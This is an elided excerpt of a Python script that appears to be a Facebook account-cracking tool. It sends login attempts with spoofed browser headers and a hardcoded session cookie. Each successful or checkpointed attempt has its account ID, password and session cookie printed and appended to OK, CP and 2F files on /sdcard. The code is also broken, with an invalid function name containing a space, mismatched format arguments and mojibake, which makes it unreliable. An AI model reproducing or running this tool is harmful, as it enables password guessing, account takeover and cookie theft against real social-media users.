...
try:
    ...
    os.system("xdg-openhttps://www.facebook.com/profile.php?id=100001687800616")
...
def checks(oks,cps,twf):
    ...
    if len(cps) != 0:
        ...
        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s \x1b[1;97mKB-2F.txt' %
              (H, P, str(len(twf))))
        input("\x1b[1;97mPRESE ENTER TO BACK RAFI ULLAH  ")
        RAFI ULLAH()
loop = 0
cps = []
oks = []
...
def RAFI ULLAH():
    os.getuid
    os.system("clear")
    print('         \x1b[97m[\033[37;41m  THIS COMMAND MADE BY MR VEER \033[0;97m] ')
...
def free(uid,pwx,tl):
    ...
    # 'cookie': 'datr=t_NxZM6kVH45wH1rOKu9ULQw; sb=t_NxZCitTrL1Sx5C-Pe628-e; m_pixel_ratio=2; wd=360x666; fr=0ZaCVnXSjP9Ov7mIh..BkcfO3.Vg.AAA.0.0.BkcfO-.AWWt_jiXUx8',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="113", "Opera";v="97"',
    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="113.0.5624.206", "Opera";v="97.0.3248.58"',
    'sec-ch-ua-mobile': '?0',
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬[VEER-OK😁]●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\nNUMBER : '+uid+'\nPASSWORD   : '+cid+' Ã¢Ë†Å¡ '+ps+ '\nCOOKIE   : '+coki+'\n●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
                cek_apk(session,coki)
                open('/sdcard/VEER-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r\033[1;35m[VEER-CP😔] \nNUMBER : '+uid+'\nPASSWORD   : '+ps+ '\n------------------------------------')
                open('/sdcard/VEER-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/VEER-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[VEER] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
